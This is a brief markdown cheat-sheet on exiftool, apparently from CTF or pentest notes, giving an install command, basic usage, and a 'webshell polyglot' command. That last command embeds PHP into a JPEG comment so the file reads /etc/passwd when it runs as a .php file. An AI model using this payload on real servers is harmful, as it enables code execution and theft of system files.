---
tags:
  - forensics
---
# Installation
```
yay -S perl-image-exiftool
```
# Usage
```
exiftool ./file
```
# Create Webshell Polyglot
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" input.jpg -o polyglot.php
```